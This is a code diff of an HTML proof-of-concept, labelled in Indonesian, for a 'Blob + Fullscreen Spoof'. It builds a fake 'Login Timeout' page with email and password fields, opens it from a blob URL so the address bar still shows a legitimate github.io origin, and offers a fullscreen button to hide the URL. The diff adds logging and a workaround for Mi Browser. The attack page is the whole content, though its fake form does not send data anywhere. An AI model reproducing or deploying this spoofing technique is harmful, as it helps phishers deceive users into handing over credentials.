@@ -1,24 +1,45 @@
 <!DOCTYPE html>
 <html>
-<body style="font-family:sans-serif;padding:20px">
-<h2>PoC COMBO - Blob + Fullscreen Spoof</h2>
-<button onclick="go()" style="padding:15px;width:100%">KLIK UNTUK SERANGAN COMBO</button>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+ body{background:white!important;color:black!important;font-family:sans-serif;padding:20px}
+ button{padding:16px;width:100%;font-size:18px;background:#0066ff;color:white;border:0;border-radius:8px}
+ #log{margin-top:15px;background:black;color:lime;padding:10px;font-family:monospace;word-break:break-all}
+</style>
+</head>
+<body>
+<h3>PoC COMBO - Blob + Fullscreen Spoof</h3>
+<button id="btn">KLIK UNTUK SERANGAN COMBO</button>
+<div id="log">Status: Siap - Klik tombol di atas</div>
+
 <script>
-function go(){
-  const fakeLogin = `
-    <div style="font-family:sans-serif;padding:20px">
-    <h2 style="color:red">Login Timeout - bonex1927.github.io</h2>
-    <p>Sesi habis, silakan login lagi:</p>
-    <input placeholder="Email" style="width:100%;padding:10px"><br><br>
-    <input type="password" placeholder="Password" style="width:100%;padding:10px"><br><br>
-    <button style="padding:10px;width:100%;background:blue;color:white">LOGIN</button>
-    <p><small>URL bar masih bonex1927.github.io padahal ini dari blob + fullscreen</small></p>
-    <button onclick="document.documentElement.requestFullscreen()" style="margin-top:20px;width:100%;padding:15px">Masuk Fullscreen (Hilangkan URL)</button>
-    </div>
-  `;
-  const blob = new Blob([fakeLogin], {type:'text/html'});
-  location.href = URL.createObjectURL(blob);
-}
+document.getElementById('btn').onclick = function(){
+  const log = document.getElementById('log');
+  try{
+    const fake = `
+      <body style="background:white;color:black;font-family:sans-serif;padding:20px">
+      <h2 style="color:red">LOGIN TIMEOUT - bonex1927.github.io</h2>
+      <p>Address bar masih <b>bonex1927.github.io</b> padahal ini dari BLOB</p>
+      <input placeholder="Email" style="width:100%;padding:12px"><br><br>
+      <input type="password" placeholder="Password" style="width:100%;padding:12px"><br><br>
+      <button style="width:100%;padding:12px;background:blue;color:white">LOGIN PALSU</button>
+      <hr>
+      <button onclick="document.documentElement.requestFullscreen()" style="width:100%;padding:15px;background:black;color:white;margin-top:20px">FULLSCREEN HIDE URL</button>
+      </body>
+    `;
+    log.textContent = "Membuat blob...";
+    const blob = new Blob([fake], {type:'text/html'});
+    const url = URL.createObjectURL(blob);
+    log.textContent += "\nURL: " + url + "\nMembuka...";
+
+    // FIX buat Mi Browser - pakai window.open + location biar gak ke-block
+    setTimeout(()=>{ window.location.href = url; }, 100);
+
+  }catch(e){
+    log.textContent = "ERROR: " + e.message;
+  }
+};
 </script>
 </body>
 </html>
